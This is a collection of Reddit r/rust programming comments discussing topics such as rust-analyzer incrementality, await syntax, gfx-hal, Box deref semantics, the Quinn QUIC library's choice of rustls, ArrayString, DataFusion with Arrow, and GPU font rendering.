&gt; Does the library blocks until it's reprocessed all uses of &gt; Option::unwrap &gt; in the codebase, and checked whether the &gt; T: Debug &gt; constraint is satisfied in every case? In this particular case no: everything is on-demand, so only files currently opened in the editor will be processed. Moreover, because everything is threaded, completion won't be blocked by highlighting. However, due to the way Rust works, there are at least a couple of cases were we'll have to do "linear" amount of work: * changing the module structure will result in re-expanding the affected crate * adding &amp; removing trait impls could result in trait index rebuilding (not sure about this one) Hopefully these are the places where salsa's fine-grained incrementality saves us. Preliminarily results are inspiring: we don't do macro expansion, but we do top-down fixed-point name resolution for modules, and it works more or less instantly for completion of `librustc`, even when one modifies module structure. C++ with textual includes, text-based macros and post-instantiation type-checking is a much harder language to analyzer lazily. So I personally would bet on making the "correct" solution work instantly in majority of cases and fast-enough for bad cases, rather than on implementing logic to use stale data model. The latter seems to be a can of worms from the implementation perspective.
Awesome question! :) It's a [hard-coded](https://github.com/rust-analyzer/rust-analyzer/blob/e0d8c86563b72e5414cf10fe16da5e88201447e2/editors/code/src/highlighting.ts#L19-L33) zenburn from [Emacs](https://github.com/bbatsov/zenburn-emacs/blob/d71a0f0556c1db785738ab9b0c989df342705a81/zenburn-theme.el#L103-L150). LSP currently does not have API for syntax highlighting (even VS Code itself does not have API for that (although underlying Monaco editor obviously does)), but I really dislike using regex for highlighting conceptually, and I don't enjoy VS Code themes. So I've implemented a custom extension to the LSP protocol and a pile of hacks in VS Code to enjoy my favorite theme :o)
I forgot about that. I guess I'm too used to doing `Foo.new` and having Resharper fix it for me ;) That said, I don't think it's good justification for prefix await: - `new` and `await` bind differently, so `await new A().B()` has exactly the kind of precedence confusion that postfix would solve - `new` is a syntax that Rust thankfully doesn't have
Here's a few ideas basically off the top of my head. * [Difficulty: Easy] Proofread The Tutorials. I write a lot more than my volunteer review team can easily cover, so if you spot textual errors just file an issue for that. * [Difficulty: Easy] Join the [Community Discord](bit.ly/rust-community) and chat with us in the `#gamedev` channel. Help spread around the skills. There's a few hundred people (not all gamedev people of course), and we've got a high quality set of rust related emoji. * [Difficulty: Medium] Help With The Outline. There's a tracking issue for the [Long Term Lesson Plan](https://github.com/Lokathor/learn-gfx-hal/issues/2), and there's also one to [Sift Through The Vulkan Cookbook](https://github.com/Lokathor/learn-gfx-hal/issues/16) for things to cover. Basically what's needed here is (1) Identify a subject for a lesson (2) bullet point the major sub-topics (3) enumerate the exact order of the steps to follow to implement one of the sub-topics (words, not code), repeat until it's all outlined. I think this is the area where non-experts can help the most the fastest. It helps if you've done this stuff before, but anyone can just research the bullet points and put it in order if they put their mind to it. * [Difficulty: Hard] Identify Good Abstractions. This one essentially requires previous experience building things with specifically `gfx-hal`. It's _close_ to vulkan but actually not quite vulkan (lifetimes, generic trait soup, attempts at type safety, having to target 3 other backends as well, etc). Experience with Vulkano might apply here, I don't know. An "abstraction" here means anything that makes gfx-hal less sharp and pointy to use. Between "raw gfx-hal" and "full high level framework" there's still a lot of useful bits of glue code to develop that can probably be used in many cases (even if not all cases). * [Difficulty: Hard] Help make compiling SPIRV code less of a garbage process. Right now the system people use is to have a build.rs that just complies the C++ compiler, and the "crate" just does calls to the C++ compiler. A pure rust system would help both gfx-hal and vulkano. Ideally we'd have a way to compile SPIRV during the rust compile cycle (via proc-macro) or on the fly while the program is running. Naturally this is no small project, I'd talk with @Rukai (the vulkano maintainer) who already wants to get this one knocked out eventually. * [Difficulty: Medium+] Help gfx-hal itself. There's a lot of work to do. Most of their efforts have gone into conformance, with other bits getting left behind. Some things have no docs. Some have docs that tell you to refer to methods that have been renamed or don't exist anymore. Some things have just enough helper code to make some specific dev's example run but are incomplete for any other use. It's a monumental task and there's only so many hands, so if you can add more I'm sure it'd be appreciated.
&gt; In his prefix await example one of the issues he points out is the noise of putting an await within a statement using await. In other languages people just don't do this. They break it up into multiple statements instead. As someone who does async/await in dayjob, I absolutely _do_ put `await` in the middle of an expression sometimes, and it makes me hate prefix await every time. If I wouldn't have needed nor wanted a variable in the sync case, I don't see why the syntax should be so ugly that I'm pushed to writing the code differently in async.
Certainly. I've played around with pre-ll gfx a bit and it's great and I'm sure will get better. I think I just would've expected device_type to be "Unknown" or something if the backend can't figure it out.
&gt; In theory the Error type could hold all of this NotFound-like information.. but which is more idiomatic for Rust? I think the question is less about Rust and more about your domain. Is `NotFound` something you'd consider a success? If so, `Result&lt;Option&lt;T&gt;, YourError&gt;` sounds totally reasonable. If not, then `Result&lt;T, YourError&gt;`, with a `YourError::NotFound` variant.
(I agree, though I might nitpick and turn things like Error::Timeout into a 504 instead of 500.)
Nice progress!!
Yes, macros apply during parsing, and thus are order-dependent in a way that the rest of rust (that has the whole AST) isn't.
I'm actually concerned about the cryptic error messages and hard time understanding the missing pieces required, I had the same experience with tokio and other libraries. I'm not exactly sure why but sometimes its really hard to use external libraries unless you start breaking the code and looking inside functions and staring at the docs for hours, even if its a 'simple' library it still happens to me(for example it took me hours to find how to use a function or more specifically how to create the wanted arguments), it did not happened with other languages that sometimes use simpler types and that makes it easy. Any advice? I guess one thing is better docs but that requires the author to put more work, is it possible to generate better docs maybe? or maybe ask the compiler which types might be a fit and how to construct them? am I missing something?
Canonical has followed Red-Hat footsteps that the only money to be made on GNU/Linux is on the server space and IoT, and has since then switched their business focus.
This really deserves its own post on the Reddit. I’m pretty sure there’s many more maths nerds in this community and the linked blog post could inspire some cool experiments!
&gt; What is this string, where did it come from and why do we have a unit “()” there? Let me see if I can explain what is going on here. Here is a very simple bit of code that would explain things. I'm confused, your `msg` folds over BufReader to create a String, what else did you expect to get?
Blocks can be used in place of expressions at any time, that's what I mean. I'll just ignore the fact that it's asking for an expression. So instead of `await? some_fn()` I'd rather just type await? `{ some_fn() }`. Both are identical in Rust.
Half the talk is literally just preamble. For instance WebAssembly is explained as an assembly-like language accepted as a W3C recommendation then he goes to explain what assembly and W3C are.
Very nice indeed. Well done. &amp;#x200B;
Looks very nice! Could you say a bit about why the `Arc` and `Rc`/`RefCell` are needed?
No, Rust doesn’t have bitfields natively, but you can just make the rust version wrap a single (private) u32, with setters/getters for those fields. Or maybe a decode() function that gives you a struct with those three fields as public, to make it easier to use it in a match.
I believe this should be possible, but it's not going to be nice to work with in rust. If you need this, I'd recommend using https://github.com/hashmismatch/packed_struct.rs/. With that said, this kind of bit packing is usually only done if interoperating with some existing data or on-disk or on-wire format which requires it. If you're just using this to store 3 ints you control, idiomatic rust would be just storing `u16,u16,u8` and not worrying about the extra 16 bits of memory per struct. Unless you hove good profiling evidence that says otherwise, I'd probably assume the speedup of having these ints aligned with 16 bit boundaries outweighs most or all of the advantage of saving memory.
&gt; A very limited language might say "the absolute only way to access the network stack is through this part of the standard library". A nitpick, I said "operating system", not "language". On Linux, the absolute only way to access the network stack is through a quite limited set of system calls. It even has the ability to limit such accesses with cgroups, as I understand. I would just rather not deal with something as low-level and unportable as the Linux kernel API. You can do this entirely in software, as you recommend, it's just harder and less reliable because you don't have a hand up from the hardware to enforce the policy you set. Even Haskell has, essentially, an "unsafe print string without monad" function, or did last time I checked. (I can't find it now.) You CAN enforce these access limits in a virtual machine (Java and .NET do exactly this), but why not do them in a non-virtual machine? :D
Is there any chance you have a semicolon at the end of your function where you meant to have a return value?
Yeah, I choose to rewrite entr in rust until I saw the watchexec crate too [https://github.com/mauri870/entr](https://github.com/mauri870/entr)
Super stoked about the change to using Arrow. Using SQL is interesting. Do you plan to move to a Rust API at some point? I feel like it's missing out on a lot of Rust's power by just using a string to query the data.
I added rustls support to `ws-rs` in a local fork because I was trying to get a pure-rust codebase that I could cross compile more easily to other target platforms. I did all the work to make everything compile with a new feature for enabling rustls, and then was very disappointed that it still depends on `ring` which [still depends on C](https://github.com/briansmith/ring/blob/master/BUILDING.md#supported-toolchains). Turns out cross-compiling from Linux to Windows using [native-tls](https://github.com/sfackler/rust-native-tls) is easier.
&gt; A nitpick, I said "operating system", not "language". Yes, *I* am saying language. Like you're saying, the absolute only way to access the network stack is through system calls, right? So what if it's impossible to do a system call without calling straight through the standard library? At some point in the dependency tree, then, anything that accesses the network *must* use `std` in that way. Sort of like how the only way to place something on the `tokio` executor is to call `tokio::spawn` or similar. That will be statically analyzable such that you could display a badge on the library page saying "Warning: this library makes system calls on &lt;line no&gt; and &lt;line no&gt;". Alternatively, one could use strong dependency injection: publish a package on fictional-package-manager.io? It physically cannot import those parts of the standard library. All system calls *must* go through arguments. So you'd need to pass in a function like `request(url: String) -&gt; Result&lt;SomeSuccess, SomeErr&gt;` to the library calls, and then it will use that function however it was planning on using the standard library. This makes the library transparent and testable. Not only can the library not call out to the network unless I give it explicit permission to do so, I can see exactly what it's requesting. I can put in middleware that logs every network request my libraries make. The biggest problem as far as I know here is that linked libraries (that is to say, they're pre-compiled and thus not part of the language) are exempt from this protection, though probably calling out to the kernel in any way is statically analyzable from the binary itself. The problem with Rust being able to do this is that unsafe calls exist and you can just put in assembly directly into your functions. These are of course detectable but a bit trickier than requiring everything to be safe/non-assembly. But, yes, the project you're working on could go a very long way towards ensuring safety. &gt; Even Haskell has, essentially, an "unsafe print string without monad" Haskell does have counterindicated unsafe methods, but that's why I said "normally" -- it could just as well *not* have had those unsafe methods, resulting in a fully (as far as I know) capabilities secure languages (at least aside from linked libraries, where I become a little out of my depth). Even if it does have them, you can statically analyze the code and answer the question: "Does this code ever call out to unsafe methods?"
Have tried both. Rocket is way more approachable in my humble opinion. Actix-web is more performant, probably a bit more capable, and runs on stable. 
Right now you have all your code in two places depending on whether `-n` was specified. What if you instead stored whether `-n` was specified in a variable of some sort, and then had your code at the end change depending on the flag variables, rather than having two separate printing branches? Then you could keep trying to read flags until you got to a non-flag, and have your code handle all combinations. Without more information on what techniques your class has introduced so far, I can't really give more concrete advise. This is definitely more of a "writing simple programs" question than a rust-specific one, I think, unless you have some strategy that you want to implement but don't know how to write in rust?
Continued to work on a procedural macro that derives a \`FromStr\` implementation based on regex annotations. Now also works with enums: [https://github.com/df5602/adhoc\_derive](https://github.com/df5602/adhoc_derive)
Perhaps type inference is failing somewhere? If you have something like `panic!()` or `unimplemented!()` it'll correctly infer that you want a `Box` but _any type_ could be `impl Future` so it doesn't know which one to pick. It then defaults to `()` and errors. If that is the problem, I'd recommend doing something like `futures::future::result(Ok(unimplemented!()))` to help the type inference. This is just a wild guess since I've run into that in the past using `impl Trait` with functions which diverge / don't return. If that isn't your function, then this post can be safely ignored.
This looks like a regression in nightly. I definitely works on stable, and on nightly since nightly-2019-01-13. If you want to develop against nightly, you can still install utils with stable with `cargo +stable install ...` 
Cool. I hadn't really thought about it in scripts, I assume `cp` would make more sense there, especially if you're distributing the scripts elsewhere. I haven't really thought much about scripts styles yet, I'll bear that in mind. (I thought briefly about having an optional config file, but that seems overkill.)
\+1 for the inner type of `SomeNoneSkip&lt;T&gt;`. `Option&lt;SomeSkip&lt;T&gt;&gt;`, while algebraically equal, suggests that `None` is a farther away error case. `SomeNoneSkip&lt;T&gt;` is also far more ergonomic to match on.
Looks great! Would you know why Rust is not mentioned in the list of supported languages at https://arrow.apache.org/ ?
Last week I began working on a GTK+ [APRS](https://en.m.wikipedia.org/wiki/Automatic_Packet_Reporting_System) client as a project to help learn me a Rust. It may be a bit ambitious, but I'm learning quite a bit. If I keep the ball rolling, this project will take me through serial communication (to talk to the modem/TNC), AX.25 (amateur radio packet networking), GUI programming, and possibly vector graphics rendering for some sexy maps. I haven't got very far yet, but I have accomplished receiving AX.25 frames from the TNC - which is a reassuring early success. I'll post more about this project if I make any notable progress.
Desktop link: https://en.wikipedia.org/wiki/Automatic_Packet_Reporting_System *** ^^/r/HelperBot_ ^^Downvote ^^to ^^remove. ^^Counter: ^^233287
That is probably not a bad idea. It isn’t part of the vulkan api but maybe that is ok. I also opened an issue to see if we can infer the device type by the version string.
And [https://www.amazon.co.uk/Programming-Rust-Jim-Blandy/dp/1491927283/](https://www.amazon.co.uk/Programming-Rust-Jim-Blandy/dp/1491927283/) is a great read!
&gt; If you're just using this to store 3 ints you control, idiomatic rust would be just storing u16,u16,u8 and not worrying about the extra 16 bits of memory per struct. The idiomatic solution would be a combination of this (for compute) and a simple type wrapping a `u32` (for the "packed" form), with conversion between those being specified by implementing the traits in std.convert. If you do it right, the compiler should be smart enough to elide the concersion steps and just compute on the original u32.
Why does [this](https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=38fde8730f9a44d7cfb6182aa01d8839) work? Here's the code in case you don't want to go to the playground: fn main() { let a = Box::new(A); let b = Box::new(a.consume()); } struct A; struct B; impl A { fn consume(self) -&gt; B { B } } We can use `&amp;self` methods on a `Box&lt;A&gt;` because `Deref`. We can use `&amp;mut self` methods on `Box&lt;A&gt;` because `DerefMut`. But what allows to call a `self` method on a box? I couldn't find a trait like this in the `Box` docs. I heard somewhere that `Box` is a tad magical, is that it? 
Yeah, sorry, you're right. Please ignore my post.
&gt; But I'm not sure it would add all that much to the current method used in Rust: variadic macros It is true that variadic macros get us pretty far, but check out the implementation of `Eq` etc for `Tuple` in [libcore](https://github.com/rust-lang/rust/blob/master/src/libcore/tuple.rs). There are cases like that in which some sort of variadic generics would be helpful.
Yeah, this is a major part of the `Box` magic. The compiler has built-in knowledge of the type that allows it to provide by-value/moving deref. It's also important to note that those `Deref` impls are actually just a facade around this deref magic: https://doc.rust-lang.org/nightly/src/alloc/boxed.rs.html#629-641 impl&lt;T: ?Sized&gt; Deref for Box&lt;T&gt; { type Target = T; fn deref(&amp;self) -&gt; &amp;T { &amp;**self } } impl&lt;T: ?Sized&gt; DerefMut for Box&lt;T&gt; { fn deref_mut(&amp;mut self) -&gt; &amp;mut T { &amp;mut **self } } This is obviously an unsatisfactory situation for some but I'm afraid I haven't kept up with the discussions as far as solutions are concerned.
&gt; drawing a new line with each step Actually, I'm not sure what you mean by this? I only ever get one line. This might be a wrapping issue; what terminal are you using?
I see that there is another Rust implementation in the list: `quiche`. Is this completely unrelated effort? Do they do something differently compared to this implementation?
Looks really nice and using arrow is a good idea! Did you look at Calcite for ideas on query optimizer architecture?
FYI, as of 4 minutes ago, it was temporarily locked, haha. It's not even the majority of people generating this discussion, either, but a few very passionate people. Since the topic has such a low barrier to entry, more aggressive zealots will enter the fray to post, often people who don't even have a vested stake in the topic, unlike, say, the creators of tokio or the developers in the Fuschia project, or any other library maintainer who has actual experience with a non-trivial async/await project. I was hesitant to even put my own opinion in the issue, but at the very least I tried to contain everything I had to say in one comment so as to avoid creating spam.
Thanks for the response. Also thank you for all the amazing work you’ve done both in python and Rust. Coincidentqlly, I started a new project in flask just today :) 
Have you tried using marker traits? That **might** help. Eg: ```rust trait Vi16: Sized + Copy + Debug + Add&lt;Self, Output = Self&gt; + Sub&lt;Self, Output = Self::Self&gt; .... {} ... pub trait Simd { type Vi16: Vi16; ... } ``` 
Quiche is indeed an unrelated effort. I think they're focused on providing a C API usable from existing non-Rust software, whereas Quinn has focused on providing a complete, idiomatic Rust interface, including futures/tokio support. We're open to having a C API too, though, so it might be interesting to explore combining efforts.
"never panics on release" is a design choice arrayvec explicitly does not make. I can see this being useful, but even so I think I still prefer `arrayvec`'s API of panicking when appending to a full string. I generally want data truncation far less frequently than I want strings too large to be treated as an error.
Really interesting, djc. 
Probably because each frame holds ownership of the original data instead of a reference. That way the original frames can fall out of scope and you'll still have your data.
Nice. I have encountered this problem, and your solution looks ideal!
Just because nobody (including myself) thought to create a PR to update it. Thanks for pointing that out!
Calcite and Apache Spark have both been inspirations for this work. There is no optimizer here yet but I have implemented optimizers in other projects and will be working on this soon (project push-down is the first rule needed).
SQL is just one way to build the query plan. The original DataFusion POC also had a Rust DataFrame API as an alternative way to build the plan. It would make sense to add this again.
That's basically correct.
You can use the try version and unwrap it, it's what arrayvec does internally.
&gt; but whatever choice is made isn't going to make a functional difference. This is only true in the sense that syntax choices won't make any difference to the static and dynamic semantics. However, how async/await feels to write will be highly impacted by whether chaining is possible or not.
How does it compare to: https://github.com/cswinter/LocustDB
I was salty and a bit overaggressive last night with my hot take. It really does matter, it's just very easy to have an opinion and share it, and our system currently rewards loud and fast opinions over well thought out and argued ones. Having slept on it, I wish `.await!()` was an easier choice to make. Of the choices, it seems the drawback of that approach are mainly in implementation rather than usage. There's a lot of complexity around postfix macros, and whether we want them at all, let alone people able to declare their own. And then the fact that it wouldn't expand to writable code, but have to just be built-in magic. It's something I care about and yet can't convince myself that any of the options really are a clear choice. Pre- or post- fix keyword macro _seems_ like the closest we'll get to "choose three", but I just don't know. And another issue I care about seeing get a great result getting this much discourse just might burn me out from contributing. I don't know, and that's the scary part. I can only await the future of the process. (Pun 110% intentional.)
Does it have to be tied to rustls? Openssl/native tls is in my opinion the more common or even required option. 
Definitely! Not disagreeing with that, just saying that having "never panics" as the default setting isn't universally better. I can probably get `arrayvec::ArrayString` to truncate on full data too, but I can see that being harder. I'll definitely check out and possibly use `arraystring` when I want that default. The rest of the time, I personally like having fail-fast defaults that I don't need to think about to enact.
They are similar in that they both aim to support efficient analytical queries. LocustDB has its own database engine and storage format, so data needs to be ingested first. DataFusion on the other hand (will) supports querying existing files in common formats such as Parquet and also against in-memory data in Arrow format. Really, the use of Arrow is the big differentiator. Arrow allows for data to be shared between difference languages and systems without the overhead of copying and serialization to different formats. 
Of course, I've commented the issue created about this, I've benchmarked and exposed the possibility of a Truncate newtype that truncates when by default where the regular ArrayString errors, I just wouldn't implement some traits for the regular ArrayString because they can't fail. To me failing fast doesn't mean panicking tho, it means choosing a API that fails because it's according to your business logic, when sometimes truncating fits the design. This was made thinking about DB integration, and while part must fail if it's bigger the rest should be truncated (like a chat message).
That’s unfortunate to hear. Was it tied to a major version bump? A way to make these sorts of upgrades graceful is to tie an algorithm to each key, and include a key identifier in each message to be verified. This allows you to upgrade algorithms as part of key rotation, so new messages are authenticated with a new key/algorithm, but old messages continue to verify and therefore you can avoid such breakages. That approach critically hinges on having a key identifier in each message though, so apologies if this is unhelpful 20/20 hindsight.
My biggest piece of advice is to avoid libraries where you find yourself doing this a lot. Its a since of a poor abstraction as it isn't encapsulating its complexity. 
Why is your example using unsigned number and trying to assert positivity. your `is_positive` function can just return `true` for all the cases.
No need to sell me on that. My language of choice is Haskell. The problem I was running into was the initial intimidation factor.
I have considered that, yes.
[https://www.twitch.tv/danthexanman\_](https://www.twitch.tv/danthexanman_)
&gt; It really does matter, it's just very easy to have an opinion and share it, and our system currently rewards loud and fast opinions over well thought out and argued ones. Oh I don't disagree with that sentiment; clearly the `await` syntax discussion garners much more comments than any important subject wrt. the type system. &gt; Having slept on it, I wish .await!() was an easier choice to make. It's not; I would like to keep `await` as a keyword for the purposes of future language design. Moreover, I think using a macro for such a key language feature gives an unpolished and second class impression. I do however think that postfix macros are a good thing, just not for `await`. My (currently) favored syntax is `foo().await.bar()` since it permits chaining, allows `await` to remain a keyword, is easy to `grep` for, is ergonomic to write (terse + power of dot), has obvious precedence, and has the Power of the Dot that people reach for (makes it easy to learn async/await by just typing `foo().`... VSCode pops up `await` as the first result). The slight drawback to it is that it looks like a field access, but I think that is something people will get over quickly and moreover `.await?` will be most common so it is easy to spot.
I have a custom struct MyStruct. I have implemented `From` for it and also want to write a custom constructor. I want to be able to invoke it like this: `MyStruct::custom_constructor(arg1, arg2);` - just like Vec. I'm tempted to write impl MyStruct { MyStruct::custom_constructor(arg1, arg2) -&gt; MyStruct { // implementation } } and this passes the borrow checker, but this would require calling invoking as `MyStruct.custom_constructor()` not `MyStruct::custom_constructor()`, right? I heard Vec uses some module trickery to achieve this but not sure how to follow up on that.
Version bumps in Python are pointless. No matter if minor or major, you basically can't change anything because everybody seems to run unpinned and without any sense of semver :) It was a major bump but that hardly helped.
Yeah, I could go either way. There's plenty of drawbacks to `.await!()`, which is why I say "I wish it was an easier choice". To me, it's the fewest steps away from being a good choice, but those steps are ones we might not want to take. Dot completion doesn't have to mean that the completed syntax has to use the dot though, that's an IDE problem and not a language problem. Many IDEs have a `expr.f&lt;|&gt;` completion for `for` that transforms it into a for loop. `.not` was one of the first postfix-completions to a prefix- operation that I built into my muscle memory. In fact, this makes me realize that even if the choice is made to go prefix, I'll probably end up writing with `.await` completion anyway then rustfmt to clean up formatting.
A previous incarnation of this project used OpenSSL, but there were a number of serious drawbacks: - OpenSSL does not yet implement the low-level APIs required for the interface to QUIC, so a modified version would have to be vendored with the project, which would undermine the benefits of using a widely-deployed library. - Even if/when OpenSSL does implement the necessary interfaces, it will be many years before an up-to-date build is widespread, and Quinn also supports platforms such as Windows where OpenSSL is not generally available at all. - Crates depending on foreign libraries are more difficult to build, and software using them is more difficult to distribute. rustls has been a pleasure to work with, and draws from BoringSSL for well-tested and mature cryptographic primitives. I think it was the right decision.
I notice you chose the Cecill license for it. That's kind of an odd choice, and one that comes with some interesting baggage beyond the licenses that people are more familiar with. What did the Cecill license provide that caused you to choose it specifically?
&gt; Dot completion doesn't have to mean that the completed syntax has to use the dot though, that's an IDE problem and not a language problem. But if we can make language design work in consort with IDEs, then that's a *good thing*. Moreover, many IDEs don't have this transform. While it is nice that you've (?) trained `.for` into muscle memory, it would never occur to me to type `.a` if the syntax didn't actually start with `.a`; I think I'm not alone in that. Thus, making language design and the power of the dot work in unison will facilitate a good experience for more (most?) people.
What do you mean? [This works fine](https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=84acd60dc8ef09be350b966c31eb0c81). 
Where did you get the Raspberry Pi and all the parts to go with it? Is there a kit I could get with everything or do I need to go hunting at Microcenter?
I am apparently an idiot at 2AM. It works indeed! Thanks a lot!
I have some downtime at work because my company was recently acquired so most of us are twiddling our thumbs while we wait for the higher-ups to decide on a direction. So, for no practical reason at all, I decided to start learning Rust. I'm going through The Book at the moment and I'm aiming to have a very basic Gtk app within a handful of weeks. Wish me luck!
Are you sure that that works!? - I would think that if you add a file to "data/*" cargo will not know to rebuild as the new file is not in the last list of `rerun-if-changed`? - I would think that even if Cargo reruns the build script the rustc incremental system ('red-green') would note that none of the inputs to the proc_macro have changed, and thus not rerun it? Of cores a test case will make what I think moot.
Apologies for the delay! &gt; Handrolling something which puts authorized tokens into a backend and only using the resource components would be possible though. The workflow is similar pretty similar to this. My employer (guess which...) has an internal authentication mechanism that's build off SigV4 + OAuth2. The primary differences from the OAuth2 spec are: - Runtime Service Discovery via the [OAuth 2.0 Authorization Server Metadata]( https://tools.ietf.org/html/draft-ietf-oauth-discovery-06) spec. - The initial authentication/handshake is done using SigV4. ...but I'm not sure those are relevant to this library, per-se.
An extreme novice here, but is there an allocation-free way to use these to convert known-worst-case types like i64 to text (in any bases from a digit-alphabet would be nice too) for further processing. The examples I've seen seem to allocate for the conversion, then allocate again as it's appended to other output - it should be possible to convert initially on the stack, then send/append this (potentially in some processed form) to some receiver. I can see examples from &amp;str and manipulating the ArrayString itself, but not converting from other std types.
No apologies necessary, it was understable enough to guess the basic use case. I added [``](https://docs.rs/oxide-auth/0.4.1/oxide_auth/primitives/issuer/struct.TokenMap.html#method.import_grant) to inject external Bearer tokens in the library provided map. So you don't have to write your `Issuer`, although I might recommend that for production use with stricter memory/processing/consistency requirements. &gt; Runtime Service Discovery via the OAuth 2.0 Authorization Server Metadata spec. Looks like something that could at least be partially supported? The response makes no use of methods not already necessary for the `WebResponse` trait and the spec looks short enough. &gt; My employer (guess which...) Too many using weird OAuth to guess ;)
I forked tokio-tls to work with async/await: https://github.com/dbcfd/tls-async. Combined with romio should make your tls life easy. 
It seems you could use ArrayString&lt;U39&gt; for that. Looking into the `Display` implementation for `i64` they already don't allocate, they basically implement ArrayString manually for their needed capacity. https://doc.rust-lang.org/src/core/fmt/num.rs.html#196 They create a 39 bytes `u8` array on the stack (uninitialized) and fill it accordingly, in the end they cast the `&amp;[u8]` to a `&amp;str`. This is how strings are implemented in rust, the std version uses `Vec&lt;u8&gt;`, we use `[u8; CAPACITY]` and you decide the capacity with the `typenum` crate (`U1`, `U2` ... `U255` - U for unsigned).
Ahh thankyou, I didn't realise they did it that way :)
So if I were to write something like this myself with no magic I would need some sort of method like: impl&lt;T&gt; MyBox&lt;T&gt; { fn take(self) -&gt; T {...} } and then I'd have to call that before calling consume, right?
I suppose that would be up to the hypothetical future maintainers, but I doubt it. At least, I don't think it makes sense to try to reimplement all of gnuplot. I meant first-class as in turning it into an actively developed crate with a documented and supported public API instead of leaving it as an unloved sub-crate of Criterion.rs.
You convinced me, so I finally [made a post about it](https://www.reddit.com/r/rust/comments/aiilyu/floatingbar_floatingpoints_rational_sibling/)!
My question is in regards to default traits. Say, I have a trait that does the following code: pub trait PushrodWidget { fn get_config(&amp;mut self) -&gt; HashMap&lt;u8, PushrodWidgetConfig&gt;; fn get_color(&amp;mut self) -&gt; types::Color { match self.get_config()[&amp;CONFIG_COLOR] { PushrodWidgetConfig::Color { color } =&gt; color, _ =&gt; [1.0; 4], } } } I want to add a _setter_ to that code as well. So far, anything I try to do with the get_config function prevents ome from doing that, as, naturally, the object is not assignable - it's not mutable. How would I get around this? Should I create a RefCell around the object, and borrow for mutability? That's probably not a bad idea, now that I think about it ... but does anyone have a better solution to that? The reason I'm doing something like this is to cut down on code copy/paste. I want to create as much reusable code as I can.
Yeah, exactly.
Makes me wonder if a DerefMove trait would be enough to solve this generically...
I am almost answering my own question! fn get_config(&amp;mut self) -&gt; RefCell&lt;HashMap&lt; ... &gt;&gt;; fn get_color(&amp;mut self) -&gt; types::Color { match self.getConfig().borrow()[&amp;CONFIG_COLOR] { ... } } fn set_color(&amp;mut self, color: types::Color) { self.get_config().borrow_mut[&amp;CONFIG_COLOR] = color; } I _believe_ that will work. If so, this is a top tip! :)
I'm learning Rust too, but I still caught a few things in your code that could be improved: * `num::complex` already has a `FromStr` implementation which can read, for example, `5 + 2i`. * I see you doing this in `parser.rs`: match some_option { None =&gt; None, Some(a) =&gt; Some(do_something(a)), } It's more idiomatic to use `Option`'s (or `Result`'s) `.map` method. `some_option.map(do_something)` is the same as the snippet above. Also look into using `unwrap_or_else` instead of the match statement at the end of `plot_set`. Option and Result have so many cool methods! * Consider using the `Either` crate instead of `Result` for the return value of `check_if_member`. It is not really an "error" when it diverges; that's just part of how the fractal works. I am disgusted that `Either` isn't in the standard library. I really like how simple this implementation is overall though -- and it taught me about how the grey areas get their shade!
Is there a "rust notation pronunciation guide" anywhere? e.g. how do you pronounce "&amp;mut" or "&amp;x" (i.e. a variable named "x")?
Here's the code I came up with: fn set_origin(&amp;mut self, point: Point) { if let Some(x) = self.get_config().borrow_mut().get_mut(&amp;CONFIG_ORIGIN) { *x = PushrodWidgetConfig::Origin { point }; } else { self.get_config().borrow_mut().insert(CONFIG_ORIGIN, PushrodWidgetConfig::Origin { point }); } } Don't everyone cringe at once. :)
all the best to nick
In the context of software development, calling something bikeshedding is a [thought-terminating cliché](https://en.wikipedia.org/wiki/Thought-terminating_clich%C3%A9) One can debate the merit of some proposal instead.
The person who wrote the font-rs library is actually beginning exploring writing one using gpu compute with gfx-hal. He's in the gfx-rs gitter: https://gitter.im/gfx-rs/gfx as well as bzm3r and nical who are also interested in 2d and font rendering. As far as existing things, I don't think there's anything that really fits what you want exactly. You'll probably want to put something together yourself with `glyph-brush` and `lyon` at this point.
DICTIONARY FILE THIS UNDER THE EXAMPLE OF MADLAD
Wow, \`gfx-hal\` looks powerful &amp; ambitious. I'll keep checking in every once in a while. Thanks for pointing to \`glyph-brush\`, I hadn't yet found it via random walks across the internet :)
You write authentication and user management by hand for every application you write? That alone is a significant amount of work. 
Use `rlua`; it is much more robust than `hlua`. [rlua::Function::call](https://docs.rs/rlua/0.16.1/rlua/struct.Function.html#method.call) is used to call a method. Here's a bit of code I use. There is a "function table.dump" available from the `Lua` context. This Rust function takes an arbitrary `lua::Value`, looks up table.dump, and calls it with that value. pub fn dump(&amp;self, v: Value) -&gt; LuaResult&lt;String&gt; { let gt: Table = self.lua.globals().raw_get("table")?; let got: LuaString = match gt.get::&lt;_, Value&gt;("dump")? { Value::Function(dumper) =&gt; dumper.call((v,)), _ =&gt; Err(LuaError::RuntimeError("table.dump wrong type".into())), }?; Ok(String::from_utf8_lossy(got.as_bytes()).into()) } 
Capabilities are a way to do that without the sledgehammer of suid.
It looks like you're putting the same origin point into the Hashmap in both branches of the `if let`. You should be able to use fn set_origin(&amp;mut self, point: Point) { self.get_config().borrow_mut().insert(CONFIG_ORIGIN, PushrodWidgetConfig::Origin { point }); }
Hey this might not be quite what you're getting at by 3d math but thought I'd mention the newish [nalgebra-glm](https://www.nalgebra.org/nalgebra_glm/) crate as this made things a lot easier for me, coming from C++ and being more familiar with glm over there :)
For anyone new to rust (like me) and interested in the state of GUI development in rust, check this out: [http://areweguiyet.com/](http://areweguiyet.com/)
Plus: - rustls has a better security track record at this point than OpenSSL or Secure Transport. You might say that's easy because it hasn't been used much, but it has been developed from the start to be safer, and I think it will hold up over time (also Baidu has been deploying it in a big way). - I have a plan to make the security protocol pluggable in Quinn so that implementers of other TLS stacks/crates could plug in. Still, the ease of use of developing rustls and its security will make it likely that rustls will always be the default for us. 
I believe "&amp;mut y" would be "borrowed reference to mutable variable y", and "&amp;x" would be "borrowed reference to x"
I have no real world experience with rust, but query optimizer is the thing I wanted to implement for some time now(tbh, this interests me more in datafusion than the "big data" aspect of it). So after you have the basic architecture in place, I'll try to help in some way with it.
Oh, that's not bad - I looked at reference code in the Rust book, and this is what they recommended. However, we're not doing a get for the object, it's just being set all together. So, I may simplify the code. Thanks!
This is really cool, thank you. It's always interesting to see people playing around with number representations and seeing just what they can do, such as [posit numbers](https://www.johndcook.com/blog/2018/04/11/anatomy-of-a-posit-number/)
Have you looked at pathfinder? It leverages the GPU to render fonts and I think it also supports a subset of SVG.
